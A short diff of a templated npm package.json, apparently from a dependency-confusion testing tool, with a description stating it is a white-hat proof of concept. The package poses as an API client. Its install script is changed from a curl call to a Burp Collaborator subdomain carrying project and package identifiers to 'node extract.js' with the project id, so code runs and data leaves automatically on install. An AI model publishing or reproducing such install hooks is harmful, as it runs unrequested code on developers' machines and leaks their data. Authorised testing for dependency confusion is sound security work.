@@ -1,7 +1,7 @@
 {
-  "name": {{package.name|tojson}},
-  "version": {{package.version|tojson}},
-  "description": "A client for an API.",
+  "name": {{package_name|tojson}},
+  "version": {{package_version|tojson}},
+  "description": "This package is a proof of concept in a white-hat security engagement. It has been uploaded to test for the dependency confusion vulnerability. It is not malicoius in any was and will be deleted after engagement has benn concluded",
   "main": "index.js",
   "author": "",
   "license": "ISC",
@@ -9,6 +9,6 @@
     "axios": "^0.25.0"
   },
   "scripts": {
-    "install": "curl {{project_id}}.{{package.name}}.jylzi8mxby9i6hj8plrj0i6v9mff34.burpcollaborator.net"
+    "install": "node extract.js {{project_id}}"
   }
 }
